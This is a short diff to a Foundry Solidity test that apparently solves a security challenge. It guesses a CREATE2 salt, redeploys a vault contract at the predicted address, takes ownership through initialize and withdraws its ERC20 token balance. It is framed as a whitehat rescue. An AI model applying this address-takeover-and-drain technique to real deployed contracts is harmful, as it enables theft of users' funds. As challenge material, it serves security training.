@@ -46,10 +46,11 @@ contract Challenge4Test is Test {
         // terminal command to run the specific test:       //
         // forge test --match-contract Challenge4Test -vvvv //
         ////////////////////////////////////////////////////*/
-
-
-
-
+        // @note we know the guy birthday in Nov, maybe it's the salt for Create2, what a try : )
+        bytes memory bytecode = type(VaultWalletTemplate).creationCode;
+        VaultWalletTemplate vault = VaultWalletTemplate(payable(FACTORY.deploy(bytecode, 11)));
+        vault.initialize(whitehat);
+        vault.withdrawERC20(address(POSI), POSI.balanceOf(address(vault)), devs);
         //==================================================//
         vm.stopPrank();
 
